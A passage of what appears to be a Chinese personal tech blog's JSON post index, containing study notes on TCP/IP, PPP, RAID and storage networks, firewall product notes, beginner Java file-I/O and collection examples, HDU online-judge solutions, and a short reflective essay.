&#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://xiaohublog.cn/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"移位变换","slug":"移位变换","permalink":"http://xiaohublog.cn/tags/%E7%A7%BB%E4%BD%8D%E5%8F%98%E6%8D%A2/"},{"name":"仿射变换","slug":"仿射变换","permalink":"http://xiaohublog.cn/tags/%E4%BB%BF%E5%B0%84%E5%8F%98%E6%8D%A2/"},{"name":"C++","slug":"C","permalink":"http://xiaohublog.cn/tags/C/"}]},{"title":"网规笔记（二）","slug":"网规笔记（二）","date":"2019-09-04T01:20:30.000Z","updated":"2021-01-22T04:26:32.386Z","comments":true,"path":"2019/09/04/网规笔记（二）/","link":"","permalink":"http://xiaohublog.cn/2019/09/04/%E7%BD%91%E8%A7%84%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"TCP/IP ISO/OSI协议族ISO/OSI模型 应用层： 表示层： 会话层： 传输层： 网络层： 数据链路层： 物理层： TCP/IP模型 应用层：FTP,telnet,SMTP,NFS,SNMP 传输层：TCP,UDP 网际层：IP,ICMP,ARP,RARP 网络接口层: ip数据:46-1500ip头部字节数:2016位标识位：用于标识分段，分片三位标志位：最后分片的位三次握手，四次挥手 PPP协议PPP:LCP（链路控制协议）,NCP（网络控制协议）,PPP扩展协议。PPP六个阶段:1.链路不可用阶段：初始阶段，2.链路建立阶段：LCP协商3.验证阶段：PAP(两次握手明文传输口令)/CHAP验证（三次握手，密文传输口令）4.网络层协议阶段：**NCP协商5.PPP会话维持阶段：维持PPP会话，定时发送Echo Request报文，并等待Echo Reply报文6.网络终止阶段：终止PPP会话，回到链路不可用阶段。protocol: 0x8021:网络控制数据NCP 0xC021:链路控制数据LCP 0xC023:安全性认证PAP 0xC223：安全性认证CHAP 网络测试和故障排除网络主动测试： 测量结点 中心服务器 中心数据库 分析服务器被动检测： 流量镜像(Sniffer)对端到端的时延，丢包，时延变化等参数比较适合于进行主动测量；而对于路径吞吐量等流量参数来说，被动测量则更适用。因此，对网络性能进行全面的测量需要主动测量与被动测量相结合，并对两种测量结果进行对比和分析，以获得更为全面科学的结论。双绞线指标：衰减，近端串扰，直流电阻，特性阻抗，衰减串扰比，电缆特性。光缆线路故障定位：先外部、后传输。光缆线路的常见障碍现象及原因： 线路全部中断 个别系统通信质量下降确定线路障碍后，用OTDR（光时域反射仪）对线路测试，以确定障碍的性质和部位。电缆故障定位仪，是一套综合性的电缆故障探测仪器，它能对电缆的高阻闪络故障，高低阻性的接地，短路和电缆的断线，接触不良等故障进行测试。 时域反射测量法（TDR）：波形对比 电弧反射法 IPv6IPv6：地址长度为128b，是IPv4地址长度的4倍。三种表示方法： 冒分十六进制表示法 0位压缩表示法（只能有一个::） 内嵌IPv4地址表示法 IPv6三种地址类型： IPv4过渡到IPv6： IPv6/IPv4双协议栈技术 隧道技术 网络地址转换技术","categories":[{"name":"网规笔记","slug":"网规笔记","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E8%A7%84%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"PPP","slug":"PPP","permalink":"http://xiaohublog.cn/tags/PPP/"},{"name":"IPv6","slug":"IPv6","permalink":"http://xiaohublog.cn/tags/IPv6/"}]},{"title":"NF学习笔记","slug":"NF笔记","date":"2019-09-03T11:03:25.000Z","updated":"2021-01-22T04:26:32.356Z","comments":true,"path":"2019/09/03/NF笔记/","link":"","permalink":"http://xiaohublog.cn/2019/09/03/NF%E7%AC%94%E8%AE%B0/","excerpt":"","text":"访问控制，类似于acl传统防火墙：基于端口的访问控制已经过时UTM：有下一代防火墙的功能，单个模块。而下一代防火墙则将这些模块组合在一起除了上一代防火墙的功能，还有应用流量控制等功能三大核心价值观：安全，稳定，易用双引擎：基础转发功能和七层安全功能隔离。NF特点： 无线热点发现 资产管理 事件关联分析 安全远程运维方案:通过防火墙远程登录堡垒机，方便运维 智能补丁方案 终端安全检查解决：终端发现的病毒可以发送给NF，NF对其进行管控 未知威胁防护：与TAC联动 云清洗联动方案：DDOS防护，与绿盟云连接 混合模式部署： 路由模式 透明模式 多出口的网络环境 多级或者VPN部署 高可用性：HA部署（双机冗余）","categories":[{"name":"网规笔记","slug":"网规笔记","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E8%A7%84%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"NF","slug":"NF","permalink":"http://xiaohublog.cn/tags/NF/"},{"name":"访问控制","slug":"访问控制","permalink":"http://xiaohublog.cn/tags/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"}]},{"title":"网规笔记（一）","slug":"网规笔记（一）","date":"2019-09-03T11:03:25.000Z","updated":"2021-01-22T04:26:32.378Z","comments":true,"path":"2019/09/03/网规笔记（一）/","link":"","permalink":"http://xiaohublog.cn/2019/09/03/%E7%BD%91%E8%A7%84%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"旁路部署：把流量镜像到设备中。 两种磁盘类型：SAS：高传输速率，磁盘性能高。支持双向全双工模式，为同时发生的读写操作提供了两路活动通道。SATA：大容量存储，磁盘性能较低，提供单通道和半双工模式相同点：均采用串行技术。采用并行接口时，传输数据和信号的总线是复用的，传输速率会到一定限制。若提高传输速率，那么传输的数据和信号往往会产生干扰，导致错误。 磁盘阵列（RAID）：1.Raid0模式RAID0连续以位或字节为单位分割数据，并行读、写于多个磁盘上，因此具有很高的传输速率，但它没有数据冗余，因此不算是真正的RAID结构。RAID0知识单纯地提高性能，并没有为数据的可靠性做保证，而且其中的一个磁盘失效将影响到所有数据。优点：在raid0状态下，存储数据被分割成两部分，分别存储在两块硬盘上，此时移动硬盘的理论存储速度是单块硬盘的2倍，实际容量等于两块硬盘中最小的一块的2倍。缺点：任何一块硬盘发生故障，整个raid上的数据将不可恢复。备注：存储高清电影比较适合。 2.raid1模式它是通过磁盘数据镜像实现数据冗余，在成对的独立磁盘上产生护卫备份的数据。当原始数据繁忙时，可直接从镜像拷贝中读取数据，因此RAID1可以提高读取性能。RAID1是磁盘阵列中单位成本最高的，但提供了很高的数据安全性和可用性，当一个磁盘失效时，系统可以自动切换到镜像磁盘上读写，而不需要重组失效的数据优点：此模式下，两块硬盘互为镜像。当一个硬盘受损时，换上一块全新的硬盘（大于或者等于原来硬盘容量）替代原硬盘即可自动恢复资料和继续使用，移动硬盘的实际容量等于较小一块硬盘的容量，存储速度与单块硬盘相同。raid1的优势在于任何一块硬盘出现故障时，所存储的数据都不会丢失。缺点 ：该模式可使用的硬盘实际容量比较小，仅仅为两颗硬盘中最小硬盘的容量。 3raid5模式：是把多个（最少3个）硬盘合并成1个逻辑盘使用，读写数据时会建立奇偶校验信息并且奇偶校验信息和相对应的数据分别存储于不同磁盘上。当RAID5的一个磁盘数据发生损坏后，利用剩下的数据和相应的奇偶校验信息去恢复被损坏的数据。相当于raid0和raid1的综合。 radio10就是raid1+raid0,比较适合速度要求高，又要完全容错，当然价格昂贵，最少需要4块硬盘（做raid10时要先做RAID1，再把数个RAID1做成RAID0，这样比先做raid0，再做raid1有更高的可靠性），虽然raid10方案造成50%的磁盘浪费，但是它提供了200%的速度和单磁盘损坏的数据安全性。 常用虚拟化实现方式： 一台虚拟多台 多台虚拟多台 常用存储方式：1、SAN存储 （存储区域网络Storage Area Network） IP-SAN： 成本低廉，购买的网线和交换机都是用以太网，甚至可以利用现有网络组建SAN； 部署简单，管理难度低； 万兆以太网的出现使得IP SAN在与FC SAN竞争时不再逊色于传输带宽； 基于IP网络的天生优势使得IP SAN很容易实现异地存储、远程容灾等穿越WAN才能实现的技术FC-SAN：早期的SAN采用的是光纤通道（FC，Fibre Channel）技术，所以，以前的SAN多指采用光纤通道的存储局域网络，业内称为FCSAN。FCSAN优势： 传输带宽高，目前有1,2,4和8Gb/s四种标准，主流的是4和8Gb/s 性能稳定可靠，技术成熟，是关键应用领域和大规模存储网络的不二选择。FCSAN缺点： 成本极其高昂，需要光纤交换机和大量的光纤布线； 维护及配置复杂，需要培训完全不同于LAN管理员的专业FC网络管理员。 2、NAS（Network Attached Storage）网络附加存储。在NAS存储结构中，存储系统不再通过I/O总线附属于某个服务器或客户机，而直接通过网络接口与网络直接相连，由用户通过网络直连。NAS实际上是一个带有瘦服务器的存储设备，其作用类似于一个专用的文件服务器。 这种专用存储服务器去掉了通用服务器原有的不适用的大多数计算功能，而仅仅提供文件系统功能。与传统服务器为中心的存储系统相比，数据不再通过服务器内存转发，直接在客户机和存储设备间传送，服务器仅起控制管理的作用。NAS的特点： NAS使用了传统以太网协议，当进行文件共享时。则利用了NFS和CIFS以沟通NTH和Unix系统。由于NFS和CIFS都是基于操作系统的文件共享协议，所以NAS的性能特点是进行小文件的共享存取。 NAS设备是直接连接到以太网的存储器，并以标准网络文件系统如NFS，SMB/CIFS over TCP/IP接口向客户端提供文件服务。NAS设备向客户提供文件级的服务。但内部依然是以数据块的层面与它的设备进行通讯。文件系统是在这个NAS存储器里。NAS的优点： NAS适用于那些需要通过网络文件数据传送到多台客户机上的用户。NAS设备在数据必须长距离传送的环境中可以很好地发挥作用。 NAS设备非常容易部署。可以使NAS主机、客户机和其他设备广泛分布在整个企业的网络环境中。NAS可以提供可靠的文件级数据整合，因为文件锁定是由设备自身来处理的。 NAS 应用于高效的文件共享任务中，例如UNIX中的NFS和Windows NT中的CIFS，其中基于网络的文件锁定提供了高级并发访问保护的功能。 3、DASDAS（Direct Attached Storage）直接附加存储，直接附加存储是指将存储设备通过总线（SCSI、PCI、IDE等）接口直接连接到一台服务器上使用。DAS购置成本低，配置简单，因此对于小型企业很有吸引力。 DAS存在问题： 服务器本身容易成为系统瓶颈。 服务器发生故障，数据不可访问。 对于存在多个服务器的系统来说，设备分散，不便管理。同时多台服务器使用DAS时，存储空间不能在服务器之间动态分配，可能造成相当的资源浪费。 数据备份操作复杂。 四、总结FC-SAN，IP-SAN，NAS，DAS区别","categories":[{"name":"网规笔记","slug":"网规笔记","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E8%A7%84%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"SAS SATA","slug":"SAS-SATA","permalink":"http://xiaohublog.cn/tags/SAS-SATA/"},{"name":"Raid","slug":"Raid","permalink":"http://xiaohublog.cn/tags/Raid/"}]},{"title":"java文件处理","slug":"java文件处理","date":"2018-12-18T10:41:14.000Z","updated":"2021-01-22T04:26:32.349Z","comments":true,"path":"2018/12/18/java文件处理/","link":"","permalink":"http://xiaohublog.cn/2018/12/18/java%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/","excerpt":"","text":"java文件操作是每个java程序必不可少的，在编写java程序中显得颇为重要。在学习完文件操作后，由于很多概念确实容易混淆，所以在这里总结一下以便以后使用，如有不对，还望多批评指正。图片来自网上大佬，觉得概括得挺详细的。 字节流按照字节流的方式读取文件中的数据（InputStream）字节输入流类InputStream用于以字节形式从数据源中读取数据，它是所有字节输入流类的父类如其子类BufferedInputStream是一个非常有用的类，可以缓冲输入的类。但是在使用完之后，一定要将该缓冲输入关闭，字节输出流也是同样。 12345678910111213141516171819202122232425262728293031323334import java.io.BufferedInputStream;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;public class SystemIOExample2 &#123; public static void main(String[] args) throws IOException &#123; // TODO Auto-generated method stub // 定义一个文件输入流对象，其内容源自d:\\\\test.txt FileInputStream in = new FileInputStream(&quot;d:\\\\test.txt&quot;); // 定义一个缓冲流对象，其内容来自文件 BufferedInputStream bufin = new BufferedInputStream(in); // 定义一个缓冲流对象，其内容来自键盘输入 BufferedInputStream keyin = new BufferedInputStream(System.in); // 定义两个字节数组 byte[] b1 = new byte[1024]; byte[] b2 = new byte[1024]; // 将从文件中读取的数据放入字节数组b1内，num1为读入的字节个数 int num1 = bufin.read(b1); // 将字节数组转换成字符串 String str1 = new String(b1, 0, num1); System.out.println(str1); // 关闭缓冲输入流，同时关闭了文件 bufin.close(); // 将从键盘输入读取的数据放入字节数组b1内,num2为读入的字节个数 int num2 = keyin.read(b2); // 将字节数组转换成字符串 String str2 = new String(b2, 0, num2); System.out.println(str2); // 关闭缓冲输入流，同时关闭了文件 keyin.close(); &#125;&#125; 用字节输出流将数据写入目的地（OutputStream）123456789101112131415161718192021222324252627282930313233343536import java.io.BufferedInputStream;import java.io.BufferedOutputStream;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;public class SystemIOExample3 &#123; public static void main(String[] args) throws IOException &#123; // TODO Auto-generated method stub // 创建文件输出流对象，其目标为d:\\test.txt文件，如果该 // 文件存在，则删除并新建该文件，否则将新建该文件 FileOutputStream out = new FileOutputStream(&quot;d:\\\\test.txt&quot;); //创建缓冲输出字节流对象 BufferedOutputStream out_buffer = new BufferedOutputStream(out); // 要写入文件的内容 String s = &quot;These will be writed to d:\\\\test.txt&quot;; // 将字符串s的内容以字节形式写入缓存区buffer_out。实际上，也就间接 // 写入到了d:\\\\test.txt文件中,getBytes()为String类的方法，其 // 作用是将字符串转化为字节数组 out_buffer.write(s.getBytes()); // 关闭缓冲流 out_buffer.close(); // 创建文件输入流对象，其内容源自文件 d:\\\\test.txt FileInputStream in = new FileInputStream(&quot;d:\\\\test.txt&quot;); // 创建缓冲输入流对象 BufferedInputStream in_buffer = new BufferedInputStream(in); byte[] b = new byte[1024]; // 将数据读入字节数组b内，num为读入的字节个数 int num = in_buffer.read(b); // 将字节数组转换为字符串 String str1 = new String(b, 0, num); System.out.println(str1); in_buffer.close(); &#125;&#125; 字符输入流类Reader字符输入类Reader用于以字符形式从数据源中读取数据，其主要派生子类包括InputStreanReader(读取字节数据并将其解码为字符)、FileReader(用来读取字符文件的内容)、BufferedReader(从字符输入流中读取文本，缓存各个字符)。利用InputStreamReader和BufferedReader类输入数据 12345678910111213141516171819202122232425262728293031import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class SystemIOExample &#123; public static void main(String[] args) throws IOException &#123; // 使用System.in构造InputStreamReader对象iin // 该对象用来从键盘读入一个单字节字符 InputStreamReader iin = new InputStreamReader(System.in); // 利用iin对象来构造BufferedReader对象stdin // 该对象用来从字符输入流中读取文本到缓冲区 BufferedReader stdin = new BufferedReader(iin); // 读取并输出字符串 System.out.println(&quot;请输入一个字符串&quot;); System.out.println(stdin.readLine()); boolean dataRight = false; do &#123; try &#123; // 读取字符串并转换成double类型输出 System.out.println(&quot;请输入一个浮点数&quot;); // 将字符串解析为带符号的double类型数据。如果数据无效，则产生一个NumberFormatException异常 double numberx = Double.parseDouble(stdin.readLine()); System.out.println(numberx); dataRight = false; &#125; catch (NumberFormatException e) &#123; System.out.println(&quot;数据无效，请重新输入&quot; + e); dataRight = true; &#125; &#125; while (dataRight = true); &#125;&#125; 按照字符流方法将数据写入文件 123456789101112131415161718192021222324package ioInJava.characterStream;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileWriter;import java.io.IOException;import java.io.InputStream;import java.io.Writer;public class CharIo &#123; public static void main(String[] args) throws IOException &#123; // 定义一个d盘根目录下的test文档，File.separator是分隔符 // 下面这句代码，就算原本没有这个文件，也会在对应的目录创建一个文件 File file = new File(&quot;D:&quot; + File.separator + &quot;test.docx&quot;); // 下面这也会抛出异常，这次我们为了代码结构清晰起见，直接throw给main吧 Writer writer = new FileWriter(file); String string = &quot;hello world！&quot;; writer.write(string); // 在这一定要记得关闭流 writer.close(); &#125;&#125; 按照字符流的方法从文件中读取数据,如要读取任意个字符数数量的文件，则可定义char[] cs = new char[(int)file.length()]。 12345678910111213141516171819202122package ioInJava.characterStream;import java.io.File;import java.io.FileNotFoundException;import java.io.FileReader;import java.io.FileWriter;import java.io.IOException;import java.io.Reader;public class ReadFromFile &#123; public static void main(String[] args) throws IOException &#123; File file = new File(&quot;d:&quot; + File.separator + &quot;test.docx&quot;); Reader reader = new FileReader(file); char[] cs= new char[1024]; // 上面定义了一个大小为1024的char型数组，如果文件内容过大，程序就会报错，而不是只读到1024的大小 reader.read(cs, 0, (int)file.length()); System.out.println(cs); reader.close(); &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"文件处理","slug":"文件处理","permalink":"http://xiaohublog.cn/tags/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/"},{"name":"流","slug":"流","permalink":"http://xiaohublog.cn/tags/%E6%B5%81/"}]},{"title":"迷失","slug":"迷失","date":"2018-12-17T10:14:23.000Z","updated":"2021-01-22T04:26:32.396Z","comments":true,"path":"2018/12/17/迷失/","link":"","permalink":"http://xiaohublog.cn/2018/12/17/%E8%BF%B7%E5%A4%B1/","excerpt":"","text":"谨以此文警醒停止追寻的自己，生而为人二十余年，一路追寻，一路迷失。人是这样易变，怎样做到不忘初心。小时候喜爱吃糖，觉得长大一定要挣好多好多钱用来买糖，可是现在买糖的钱有了，却也没有当初那份喜爱。后来又有很多很多想要的东西，可是当我们有能力去满足时，却发现那些东西早已不能给我们带来任何满足。我们一直在努力，却终究一无所得。年龄一直在增长，但是自己所拥有的财富也好，知识也罢，都无所长进。已经错过的，不再斤斤计较，以后的日子很长很远，要学会爱上自己。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://xiaohublog.cn/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[]},{"title":"杭电OJ2000-2010java解答","slug":"杭电OJ2000-2010解答","date":"2018-11-23T11:03:25.000Z","updated":"2021-01-22T04:26:32.362Z","comments":true,"path":"2018/11/23/杭电OJ2000-2010解答/","link":"","permalink":"http://xiaohublog.cn/2018/11/23/%E6%9D%AD%E7%94%B5OJ2000-2010%E8%A7%A3%E7%AD%94/","excerpt":"","text":"都是一些最基础的算法题，固然很简单，但是自己一道一道的做下来，也能学到一些东西。通过做这些题目，也大概了解OJ题目的解答规范，也是受益匪浅。杭电OJ2000题-ASCII码排序 1234567891011121314151617181920import java.util.Arrays;import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; char[] arr = new char[3]; Scanner in = new Scanner(System.in); while (in.hasNext()) &#123; String str = in.nextLine(); for (int i = 0; i &lt; 3; i++) &#123; arr[i] = str.charAt(i); &#125; Arrays.sort(arr); for (int i = 0; i &lt; 3; i++) &#123; System.out.print((i == 2) ? (arr[i]) : (arr[i] + &quot; &quot;)); &#125; System.out.println(); &#125; &#125;&#125; 杭电OJ2001-计算两点间的距离 1234567891011121314151617import java.io.BufferedInputStream;import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; double[] d = new double[4]; Scanner in = new Scanner(new BufferedInputStream(System.in)); while (in.hasNext()) &#123; for (int i = 0; i &lt; 4; i++) &#123; d[i] = in.nextDouble(); &#125; double tp = Math.sqrt((d[2] - d[0]) * (d[2] - d[0]) + (d[3] - d[1]) * (d[3] - d[1])); System.out.printf(&quot;%.2f&quot;, tp); System.out.println(); &#125; &#125;&#125; 杭电OJ2002-计算球体体积 1234567891011121314import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; final double PI = 3.1415927; Scanner in = new Scanner(System.in); while (in.hasNext()) &#123; double r = in.nextDouble(); double volume = PI * r * r * r * (double) 4 / (double) 3; System.out.printf(&quot;%.3f&quot;, volume); System.out.println(); &#125; &#125;&#125; 杭电OJ2003-求绝对值 123456789101112131415import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); while (in.hasNext()) &#123; double n = in.nextDouble(); if (n &lt; 0) &#123; n = -n; &#125; System.out.printf(&quot;%.2f&quot;, n); System.out.println(); &#125; &#125;&#125; 杭电OJ2004-成绩转换 12345678910111213141516171819202122import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; Scanner in=new Scanner(System.in); while(in.hasNext()) &#123; int score=in.nextInt(); if(score&gt;=90&amp;&amp;score&lt;=100) System.out.println(&quot;A&quot;); else if(score&gt;=80&amp;&amp;score&lt;90) System.out.println(&quot;B&quot;); else if(score&gt;=70&amp;&amp;score&lt;80) System.out.println(&quot;C&quot;); else if(score&gt;=60&amp;&amp;score&lt;70) System.out.println(&quot;D&quot;); else if(score&gt;=0&amp;&amp;score&lt;60) System.out.println(&quot;E&quot;); else System.out.println(&quot;Score is error!&quot;); &#125; &#125;&#125; 杭电OJ2005-第几天？该题使用split对日期格式进行解析，然后将年月日存到数组中去，再遍历统计天数，。这是我对这道题目的思路，但是不知道什么原因，未能通过OJ的测试，代码如下： 1234567891011121314151617181920212223242526import java.util.Scanner;public class HDOJ2005 &#123; public static void main(String[] args) &#123; int[] s = &#123; 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 &#125;; int num = 0; Scanner in = new Scanner(System.in); while (in.hasNext()) &#123; String str = in.nextLine(); String[] date = str.split(&quot;/&quot;); // 解析日期 int y = Integer.parseInt(date[0]); int m = Integer.parseInt(date[1]); int d = Integer.parseInt(date[2]); for (int i = 0; i &lt; m - 1; i++) num += s[i]; if (y % 400 == 0 || (y % 4 == 0 &amp;&amp; y % 100 != 0)) &#123; if (m &gt; 2) num += d + 1; else num += d; &#125; else num += d; System.out.println(num); &#125; &#125;&#125; 已通过测试的代码： 12345678910111213141516171819202122232425262728293031import java.util.*;class Main&#123; public static void main (String args[])&#123; Scanner sc = new Scanner(System.in); while(sc.hasNext())&#123; String str = sc.nextLine(); String[] date = str.split(&quot;/&quot;); //解析出 年 月 日 int n = Integer.parseInt(date[0]); int y = Integer.parseInt(date[1]); int r = Integer.parseInt(date[2]); int t = 0; switch(y)&#123; case 1 : t+=r;break; case 2: t+=31+r;break; case 3: t+=59+r;break; case 4: t+=90+r;break; case 5: t+=120+r;break; case 6: t+=151+r;break; case 7: t+=181+r;break; case 8: t+=212+r;break; case 9: t+=243+r;break; case 10: t+=273+r;break; case 11: t+=304+r;break; case 12: t+=334+r; &#125; if((n%400==0||(n%4==0&amp;&amp;n%100!=0))&amp;&amp;y&gt;2) System.out.println(t+1); else System.out.println(t); &#125; &#125;&#125; 杭电OJ2006-求奇数的乘积 12345678910111213141516171819import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); while (in.hasNext()) &#123; int sum=1; int num = in.nextInt(); int[] s = new int[num]; for (int i = 0; i &lt;s.length; i++) &#123; s[i] = in.nextInt(); if(s[i]%2!=0) &#123; sum*=s[i]; &#125; &#125; System.out.println(sum); &#125; &#125;&#125; 杭电OJ2007-平方和与立方和 123456789101112131415161718192021222324import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); while (in.hasNext()) &#123; int sum1 = 0, sum2 = 0, temp; int n = in.nextInt(); int m = in.nextInt(); if (n &gt; m) &#123; temp = n; n = m; m = temp; &#125; for (; n &lt;= m; n++) &#123; if (n % 2 == 0) &#123; sum1 += n * n; &#125; else sum2 += n * n * n; &#125; System.out.println(sum1 + &quot; &quot; + sum2); &#125; &#125;&#125; 杭电OJ2008-数值统计 123456789101112131415161718192021222324252627import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); while (in.hasNext()) &#123; int num = in.nextInt(); if (num == 0) &#123; break; &#125; else &#123; int count1 = 0, count2 = 0, count3 = 0; for (int i = 0; i &lt;= num - 1; i++) &#123; double number = in.nextDouble(); if (number &lt; 0) &#123; count1 += 1; &#125; else if (number == 0) &#123; count2 += 1; &#125; else if(number&gt;0) count3 += 1; &#125; System.out.println(count1 + &quot; &quot; + count2 + &quot; &quot; + count3); &#125; &#125; &#125;&#125; 杭电OJ2009-求数列的和 123456789101112131415161718import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; Scanner in=new Scanner(System.in); while(in.hasNext()) &#123; double sum=0; double n=in.nextDouble(); int m=in.nextInt(); for(int j=0;j&lt;m;j++) &#123; sum+=n; n=Math.sqrt(n); &#125; System.out.printf(&quot;%.2f&quot;,sum); System.out.println(); &#125; &#125;&#125; 杭电OJ2010-水仙花数 12345678910111213141516171819202122232425262728293031323334353637import java.util.Scanner;public class Main &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); int n; int m; int[] s = new int[1000]; while (in.hasNext()) &#123; int j = 0; n = in.nextInt(); m = in.nextInt(); if (n &gt; m) &#123; int temp = n; n = m; m = temp; &#125; for (int i = n; i &lt;= m; i++) &#123; int a = i % 10; int b = i % 100 / 10; int c = i / 100; if (a * a * a + b * b * b + c * c * c == i) &#123; s[j++] = i; &#125; &#125; for (int i = 0; i &lt;= j - 1; i++) &#123; if (i &lt; j - 1) &#123; System.out.print(s[i] + &quot; &quot;); &#125; else System.out.println(s[i]); &#125; if (j == 0) &#123; System.out.println(&quot;no&quot;); &#125; &#125; &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://xiaohublog.cn/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法入门","slug":"算法入门","permalink":"http://xiaohublog.cn/tags/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"},{"name":"杭电OJ","slug":"杭电OJ","permalink":"http://xiaohublog.cn/tags/%E6%9D%AD%E7%94%B5OJ/"}]},{"title":"Collection和Iterator接口","slug":"Collection和Iterator接口","date":"2018-11-10T12:56:40.000Z","updated":"2021-01-22T04:26:32.334Z","comments":true,"path":"2018/11/10/Collection和Iterator接口/","link":"","permalink":"http://xiaohublog.cn/2018/11/10/Collection%E5%92%8CIterator%E6%8E%A5%E5%8F%A3/","excerpt":"","text":"深入学习Collection和Iterator接口Collection接口Collection接口是List,Set和Queue接口的父接口 boolean add(Object o):该方法用于向集合里添加元素，如添加成功则返回true boolean addAll(Collection c):把集合c中所有元素添加到指定集合中，如添加成功则返回true void clear():清除集合中所有的元素，将集合长度变为0 boolean contains(Object o):返回集合内是否包含指定元素,如果是，则返回true boolean containsAll(Collection c):返回集合是否包含集合c内所有元素，如果是，则返回true boolean isEmpty():判断集合是否为空，如为空，则为true Iterator iterator():返回一个iterator，用于遍历集合里的元素 boolean remove(Object o):删除集合中的o元素，如有多个，则全被删除 boolean removeAll(Collection c):删除集合c中包含的所有元素（相当于调用该方法的集合减去集合c），如删除一个或以上的元素，则返回true boolean retain(Collection c):在指定集合删除集合c中没有的元素（相当与指定集合和集合c取交集），如果改操作改变了调用该方法的集合，则返回true int size():返回集合里元素的个数 Object[] toArray():把集合转化为数组，所有集合元素转换为对应的数组元素Iterator接口 boolean hasNext():如果被迭代的元素还没有被遍历，则返回true Object next():返回集合里下一个元素 void remove():删除集合里上一次next返回的元素 Iterator必须依附于Collection对象。有一个Iterator对象，则必然有一个与之对应的对象。当时用Iterator来迭代Colllection元素时，Collection里的元素不能被改变。 使用Iterator遍历集合元素: 1234567891011121314public class TestForeach &#123; public static void main(String[] args) &#123; //创建Collection对象 Collection books=new HashSet(); books.add(new String(&quot;java企业轻量级&quot;)); books.add(new String(&quot;人间失格&quot;)); books.add(new String(&quot;java入门到精通&quot;)); Iterator it=books.iterator(); while(it.hasNext()) &#123; String book=(String)it.next(); System.out.println(book); &#125; &#125;&#125; 对比使用foreach遍历集合元素: 1234567891011121314public class TestForeach &#123; public static void main(String[] args) &#123; //创建Collection对象 Collection books=new HashSet(); books.add(new String(&quot;java企业轻量级&quot;)); books.add(new String(&quot;人间失格&quot;)); books.add(new String(&quot;java入门到精通&quot;)); Iterator it=books.iterator(); for(Object obj:books) &#123; String book=(String)obj; System.out.println(book); &#125; &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"日常学习","slug":"日常学习","permalink":"http://xiaohublog.cn/tags/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"},{"name":"Collection和Iterator接口","slug":"Collection和Iterator接口","permalink":"http://xiaohublog.cn/tags/Collection%E5%92%8CIterator%E6%8E%A5%E5%8F%A3/"}]},{"title":"java for循环的用法","slug":"java-for循环的用法","date":"2018-11-10T06:56:08.000Z","updated":"2021-01-22T04:26:32.343Z","comments":true,"path":"2018/11/10/java-for循环的用法/","link":"","permalink":"http://xiaohublog.cn/2018/11/10/java-for%E5%BE%AA%E7%8E%AF%E7%9A%84%E7%94%A8%E6%B3%95/","excerpt":"","text":"1、遍历数组的传统方法新建一个整形数组s，采用for循环遍历 123456789public class Test &#123; public static void main(String[] args) &#123; int[] s= &#123;1,2,4,5,6,5&#125;; for(int i=0;i&lt;s.length;i++) &#123; int j=s[i]; System.out.println(j); &#125; &#125;&#125; 2、java 增强for循环实现数组的遍历12345678public class Test &#123; public static void main(String[] args) &#123; int[] s= &#123;1,2,4,5,6,5&#125;; for(int i:s) &#123; System.out.println(i); &#125; &#125;&#125; 3、遍历Collection对象的传统方方法1234567891011121314public class Test &#123; public static void main(String[] args) &#123; // 建立一个Collection对象 String[] strings = &#123; &quot;H&quot;, &quot;E&quot;, &quot;l&quot;, &quot;L&quot;, &quot;O&quot; &#125;; Collection stringList = java.util.Arrays.asList(strings); // Iterable接口（迭代遍历） 注：优先选择Iterator接口，遍历Collection里所有元素， // 也称为迭代器和迭代精灵；迭代是取出集合中元素的一种推荐方式。 // 开始遍历 for (Iterator itr = stringList.iterator(); itr.hasNext();) &#123; Object str = itr.next(); System.out.println(str); &#125; &#125;&#125; 4、java 增强for循环实现遍历Collection对象1234567891011public class Test &#123; public static void main(String[] args) &#123; // 建立一个Collection String[] strings = &#123; &quot;H&quot;, &quot;E&quot;, &quot;L&quot;, &quot;L&quot; ,&quot;O&quot;&#125;; Collection list = java.util.Arrays.asList(strings); // 开始遍历 for (Object str : list) &#123; System.out.println(str); &#125; 